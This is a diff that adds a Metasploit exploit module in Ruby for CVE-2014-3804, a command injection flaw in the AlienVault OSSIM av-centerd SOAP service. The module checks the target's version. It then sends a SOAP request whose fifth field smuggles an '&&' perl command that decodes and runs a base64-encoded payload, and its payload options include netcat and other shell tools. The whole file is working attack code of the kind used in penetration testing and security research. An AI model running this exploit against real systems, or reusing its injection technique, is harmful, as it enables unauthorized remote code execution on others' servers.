@@ -1,0 +1,140 @@
+##
+# This module requires Metasploit: http//metasploit.com/download
+# Current source: https://github.com/rapid7/metasploit-framework
+##
+
+require 'msf/core'
+require 'rexml/document'
+
+class Metasploit3 < Msf::Exploit::Remote
+  Rank = ExcellentRanking
+
+  include Msf::Exploit::Remote::HttpClient
+  include REXML
+
+  def initialize(info = {})
+    super(update_info(info,
+      'Name'          => 'AlienVault OSSIM av-centerd Command Injection',
+      'Description'   => %q{
+        This module exploits a code execution flaw in AlienVault 4.6.1 and
+        prior.  The vulnerability exists in the av-centerd SOAP web service,
+        where the update_system_info_debian_package method uses perl backticks
+        in an insecure way, allowing command injection. This module has been
+        tested successfully on AlienVault 4.6.0.
+      },
+      'Author'        =>
+        [
+          'Unknown', # From HP ZDI team, Vulnerability discovery
+          'juan vazquez' # Metasploit module
+        ],
+      'License'       => MSF_LICENSE,
+      'References'    =>
+        [
+          ['CVE', '2014-3804'],
+          ['BID', '67999'],
+          ['ZDI', '14-202'],
+          ['URL', 'http://forums.alienvault.com/discussion/2690']
+        ],
+      'Privileged'     => true,
+      'Platform'       => 'unix',
+      'Arch'           => ARCH_CMD,
+      'Payload'        =>
+        {
+          #'BadChars'   => "[;`$<>|]", # Don't apply bcuz of the perl stub applied
+          'Compat'      => {
+            'RequiredCmd' => 'perl netcat-e openssl python gawk'
+          }
+        },
+      'DefaultOptions' =>
+        {
+          'SSL' => true
+        },
+      'Targets'        =>
+        [
+          [ 'AlienVault <= 4.6.1', { }]
+        ],
+      'DefaultTarget'  => 0,
+      'DisclosureDate' => 'May 5 2014'))
+
+    register_options(
+      [
+        Opt::RPORT(40007)
+      ], self.class)
+  end
+
+  def check
+    version = ""
+    res = send_soap_request("get_dpkg")
+
+    if res &&
+       res.code == 200 &&
+       res.headers['SOAPServer'] &&
+       res.headers['SOAPServer'] =~ /SOAP::Lite/ &&
+       res.body.to_s =~ /alienvault-center\s*([\d\.]*)-\d/
+
+      version = $1
+    end
+
+    if version.empty? || version >= "4.7.0"
+      return Exploit::CheckCode::Safe
+    else
+      return Exploit::CheckCode::Appears
+    end
+  end
+
+  def exploit
+    send_soap_request("update_system_info_debian_package", 1)
+  end
+
+  def build_soap_request(method)
+    xml = Document.new
+    xml.add_element(
+      "soap:Envelope",
+      {
+        'xmlns:xsi'          => "http://www.w3.org/2001/XMLSchema-instance",
+        'xmlns:soapenc'      => "http://schemas.xmlsoap.org/soap/encoding/",
+        'xmlns:xsd'          => "http://www.w3.org/2001/XMLSchema",
+        'soap:encodingStyle' => "http://schemas.xmlsoap.org/soap/encoding/",
+        'xmlns:soap'         => "http://schemas.xmlsoap.org/soap/envelope/"
+      })
+    body = xml.root.add_element("soap:Body")
+    m = body.add_element(
+      method,
+      {
+        'xmlns' => "AV/CC/Util"
+      })
+    args = []
+    args[0] = m.add_element("c-gensym3", {'xsi:type' => 'xsd:string'})
+    args[1] = m.add_element("c-gensym5", {'xsi:type' => 'xsd:string'})
+    args[2] = m.add_element("c-gensym7", {'xsi:type' => 'xsd:string'})
+    args[3] = m.add_element("c-gensym9", {'xsi:type' => 'xsd:string'})
+    (0..3).each { |i| args[i].text = rand_text_alpha(4 + rand(4)) }
+
+    if method == "update_system_info_debian_package"
+      args[4] = m.add_element("c-gensym11", {'xsi:type' => 'xsd:string'})
+      perl_payload  = "system(decode_base64"
+      perl_payload += "(\"#{Rex::Text.encode_base64(payload.encoded)}\"))"
+      args[4].text  = "#{rand_text_alpha(4 + rand(4))}"
+      args[4].text += " && perl -MMIME::Base64 -e '#{perl_payload}'"
+    end
+
+    xml.to_s
+  end
+
+  def send_soap_request(method, timeout = 20)
+    soap = build_soap_request(method)
+
+    res = send_request_cgi({
+      'uri'      => '/av-centerd',
+      'method'   => 'POST',
+      'ctype'    => 'text/xml; charset=UTF-8',
+      'data'     => soap,
+      'headers'  => {
+        'SOAPAction' => "\"AV/CC/Util##{method}\""
+      }
+    }, timeout)
+
+    res
+  end
+
+end
